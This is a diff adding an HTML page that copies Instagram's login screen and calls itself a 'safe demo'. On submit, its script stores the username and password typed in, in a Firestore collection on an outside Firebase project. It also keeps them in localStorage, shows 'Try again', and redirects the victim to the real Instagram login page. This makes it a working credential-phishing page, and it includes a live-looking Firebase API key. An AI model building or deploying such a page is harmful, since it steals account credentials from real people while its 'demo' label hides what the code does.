@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Demo + Firebase</title>
+
+  <style>
+    /* Your existing CSS ya<style>
+/* ===== Reset ===== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+               Roboto, Helvetica, Arial, sans-serif;
+}
+
+/* ===== Page Background ===== */
+body {
+  background-color: #fafafa;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+/* ===== Container ===== */
+.container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+/* ===== Login Box ===== */
+.login-box {
+  width: 350px;
+  background: #fff;
+  border: 1px solid #dbdbdb;
+  padding: 40px;
+  text-align: center;
+  border-radius: 5px;
+  margin-bottom: 15px;
+}
+
+.login-box img {
+  margin-bottom: 20px;
+}
+
+/* ===== Input Fields ===== */
+.login-box input {
+  width: 100%;
+  padding: 9px;
+  margin-bottom: 8px;
+  background: #fafafa;
+  border: 1px solid #dbdbdb;
+  border-radius: 3px;
+  font-size: 14px;
+}
+
+.login-box input:focus {
+  outline: none;
+  border-color: #a8a8a8;
+}
+
+/* ===== Login Button ===== */
+.login-box #loginBtn {
+  width: 100%;
+  margin-top: 10px;
+  padding: 9px;
+  background-color: #4cb5f9;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+
+.login-box #loginBtn:hover {
+  background-color: #339af0;
+}
+
+/* ===== Error / Demo Message ===== */
+.error-text {
+  margin-top: 10px;
+  font-size: 12px;
+  color: #ed4956;
+  display: none; /* Hidden initially */
+}
+
+/* ===== Note Text ===== */
+.note {
+  font-size: 12px;
+  color: #999;
+  margin-top: 5px;
+}
+
+/* ===== Forgot Password Link ===== */
+.forgot {
+  display: block;
+  font-size: 12px;
+  color: #00376b;
+  text-decoration: none;
+  margin-top: 15px;
+}
+
+/* ===== Divider ===== */
+.divider {
+  display: flex;
+  align-items: center;
+  margin: 20px 0;
+  color: #8e8e8e;
+  font-size: 12px;
+  font-weight: 600;
+}
+
+.divider::before,
+.divider::after {
+  content: "";
+  flex: 1;
+  height: 1px;
+  background: #dbdbdb;
+}
+
+.divider::before {
+  margin-right: 18px;
+}
+
+.divider::after {
+  margin-left: 18px;
+}
+
+/* ===== Facebook Login Link ===== */
+.facebook-login {
+  display: block;
+  color: #385185;
+  font-weight: 600;
+  text-decoration: none;
+  font-size: 14px;
+  margin-bottom: 10px;
+}
+
+/* ===== Signup Box ===== */
+.signup-box {
+  width: 350px;
+  background: #fff;
+  border: 1px solid #dbdbdb;
+  padding: 15px 0;
+  text-align: center;
+  font-size: 14px;
+  border-radius: 5px;
+}
+
+.signup-box a {
+  color: #4cb5f9;
+  text-decoration: none;
+  font-weight: 600;
+  margin-left: 5px;
+}
+
+/* ===== Responsive ===== */
+@media (max-width: 400px) {
+  .login-box, .signup-box {
+    width: 90%;
+  }
+}
+ha rahega */
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <!-- Login Box -->
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" width="175">
+
+      <!-- SAFE DEMO FORM -->
+      <form id="loginForm">
+        <!-- ✅ Editable: Field id aur placeholder -->
+        <input type="text" id="User" placeholder="Username" required>
+        <input type="password" id="Pass" placeholder="Password" required>
+        <!-- ✅ Editable: Button text -->
+        <button type="submit" id="loginBtn">Log In</button>
+      </form>
+
+      <div class="error-text" id="errorMsg">Try again</div>
+     
+
+      <a href="#" class="forgot">Forgot password?</a>
+      <div class="divider">OR</div>
+      <a href="#" class="facebook-login">Log in with Facebook</a>
+    </div>
+
+    <!-- Signup Box -->
+    <div class="signup-box">
+      Don't have an account?<a href="#">Sign up</a>
+    </div>
+  </div>
+
+  <!-- ================= FIREBASE SDK ================= -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+    // 🔹 Editable: Apna Firebase config yaha daalein
+    const firebaseConfig = {
+      apiKey: "AIzaSyA0ws2RlbvBUjrdf4hUmRRbiXSSMb1SyIg",
+      authDomain: "loginproject-b5d6e.firebaseapp.com",
+      projectId: "loginproject-b5d6e",
+      storageBucket: "loginproject-b5d6e.firebasestorage.app",
+      messagingSenderId: "875733351851",
+      appId: "1:875733351851:web:c3f4f3a74c67d5c08126ee"
+    };
+
+    // 🔹 Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // ================= FORM SUBMIT =================
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+
+      // ✅ Editable: Field ids
+      const user = document.getElementById("User").value;
+      const pass = document.getElementById("Pass").value;
+
+      // 🔹 Save data to Firebase
+      try {
+        await addDoc(collection(db, "logindata"), {  // 🔹 Editable: collection name "logins"
+          username: user,                        // 🔹 Editable: field name
+          password: pass,                        // 🔹 Editable: field name
+          
+        });
+
+        // ✅ Local storage (optional)
+        localStorage.setItem("username", user);
+        localStorage.setItem("password", pass);
+
+        // Show error text (demo)
+        document.getElementById("errorMsg").style.display = "block";
+
+        // Redirect after 0.20 sec
+        setTimeout(function () {
+          window.location.href = "https://www.instagram.com/accounts/login/";
+        }, 200);
+
+      } catch(err) {
+        console.error("Firebase error:", err);
+        document.getElementById("errorMsg").innerText = "Error saving data ❌";
+        document.getElementById("errorMsg").style.display = "block";
+      }
+    });
+  </script>
+
+</body>
+  </html>
